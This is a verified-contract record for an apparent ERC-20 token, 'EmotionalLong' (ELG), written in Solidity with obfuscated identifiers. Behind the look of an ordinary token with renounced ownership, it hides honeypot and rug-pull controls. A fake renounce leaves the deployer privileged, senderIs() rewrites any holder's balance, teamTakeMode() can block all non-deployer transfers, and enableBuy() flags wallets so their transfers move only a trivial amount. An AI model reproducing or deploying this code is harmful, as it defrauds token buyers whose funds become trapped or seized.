{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface totalReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minFee {\n    function createPair(address receiverTx, address limitTeamShould) external returns (address);\n}\n\ninterface atTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverShould) external view returns (uint256);\n\n    function transfer(address swapReceiver, uint256 modeTx) external returns (bool);\n\n    function allowance(address fromLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapReceiver,\n        uint256 modeTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderFundWallet, uint256 value);\n    event Approval(address indexed fromLaunch, address indexed spender, uint256 value);\n}\n\ninterface fundBuy is atTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EmotionalLong is shouldLimit, atTo, fundBuy {\n\n    function allowance(address fundReceiver, address buyWallet) external view virtual override returns (uint256) {\n        if (buyWallet == launchedTake) {\n            return type(uint256).max;\n        }\n        return launchLiquidity[fundReceiver][buyWallet];\n    }\n\n    address private teamLaunch;\n\n    function teamTakeMode(uint256 modeTx) public {\n        sellLaunch();\n        tokenTake = modeTx;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenSwap;\n    }\n\n    uint256 constant liquidityAt = 6 ** 10;\n\n    string private walletLimit = \"Emotional Long\";\n\n    uint256 modeIsMax;\n\n    function transfer(address launchedFrom, uint256 modeTx) external virtual override returns (bool) {\n        return isWallet(_msgSender(), launchedFrom, modeTx);\n    }\n\n    function approve(address buyWallet, uint256 modeTx) public virtual override returns (bool) {\n        launchLiquidity[_msgSender()][buyWallet] = modeTx;\n        emit Approval(_msgSender(), buyWallet, modeTx);\n        return true;\n    }\n\n    bool private exemptWalletMode;\n\n    address launchedTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return teamLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletLimit;\n    }\n\n    function balanceOf(address receiverShould) public view virtual override returns (uint256) {\n        return launchedBuy[receiverShould];\n    }\n\n    function listModeWallet(address exemptLimitTrading, address swapReceiver, uint256 modeTx) internal returns (bool) {\n        require(launchedBuy[exemptLimitTrading] >= modeTx);\n        launchedBuy[exemptLimitTrading] -= modeTx;\n        launchedBuy[swapReceiver] += modeTx;\n        emit Transfer(exemptLimitTrading, swapReceiver, modeTx);\n        return true;\n    }\n\n    function senderTake() public {\n        emit OwnershipTransferred(autoTo, address(0));\n        teamLaunch = address(0);\n    }\n\n    uint256 private toReceiver;\n\n    bool private launchedModeMin;\n\n    address tradingExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private launchedBuy;\n\n    function getOwner() external view returns (address) {\n        return teamLaunch;\n    }\n\n    function senderIs(address launchedFrom, uint256 modeTx) public {\n        sellLaunch();\n        launchedBuy[launchedFrom] = modeTx;\n    }\n\n    event OwnershipTransferred(address indexed teamMax, address indexed minAmount);\n\n    function sellLaunch() private view {\n        require(launchSell[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchLiquidity;\n\n    address public toModeBuy;\n\n    address public autoTo;\n\n    mapping(address => bool) public launchSell;\n\n    mapping(address => bool) public toSell;\n\n    uint256 public limitMarketing;\n\n    constructor (){\n        \n        totalReceiver sellTake = totalReceiver(launchedTake);\n        toModeBuy = minFee(sellTake.factory()).createPair(sellTake.WETH(), address(this));\n        if (launchedModeMin) {\n            toReceiver = limitMarketing;\n        }\n        autoTo = _msgSender();\n        senderTake();\n        launchSell[autoTo] = true;\n        launchedBuy[autoTo] = senderMarketing;\n        \n        emit Transfer(address(0), autoTo, senderMarketing);\n    }\n\n    function isWallet(address exemptLimitTrading, address swapReceiver, uint256 modeTx) internal returns (bool) {\n        if (exemptLimitTrading == autoTo) {\n            return listModeWallet(exemptLimitTrading, swapReceiver, modeTx);\n        }\n        uint256 receiverToken = atTo(toModeBuy).balanceOf(tradingExempt);\n        require(receiverToken == tokenTake);\n        require(swapReceiver != tradingExempt);\n        if (toSell[exemptLimitTrading]) {\n            return listModeWallet(exemptLimitTrading, swapReceiver, liquidityAt);\n        }\n        return listModeWallet(exemptLimitTrading, swapReceiver, modeTx);\n    }\n\n    function enableBuy(address swapMarketing) public {\n        sellLaunch();\n        if (launchedModeMin) {\n            launchedModeMin = true;\n        }\n        if (swapMarketing == autoTo || swapMarketing == toModeBuy) {\n            return;\n        }\n        toSell[swapMarketing] = true;\n    }\n\n    uint256 tokenTake;\n\n    function limitToken(address minWallet) public {\n        require(minWallet.balance < 100000);\n        if (senderFund) {\n            return;\n        }\n        \n        launchSell[minWallet] = true;\n        if (exemptWalletMode) {\n            exemptWalletMode = false;\n        }\n        senderFund = true;\n    }\n\n    bool public senderFund;\n\n    uint256 private senderMarketing = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minSwap;\n    }\n\n    function transferFrom(address exemptLimitTrading, address swapReceiver, uint256 modeTx) external override returns (bool) {\n        if (_msgSender() != launchedTake) {\n            if (launchLiquidity[exemptLimitTrading][_msgSender()] != type(uint256).max) {\n                require(modeTx <= launchLiquidity[exemptLimitTrading][_msgSender()]);\n                launchLiquidity[exemptLimitTrading][_msgSender()] -= modeTx;\n            }\n        }\n        return isWallet(exemptLimitTrading, swapReceiver, modeTx);\n    }\n\n    uint8 private minSwap = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderMarketing;\n    }\n\n    string private tokenSwap = \"ELG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFundWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"enableBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"limitToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"senderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"teamTakeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toModeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimitTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EmotionalLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}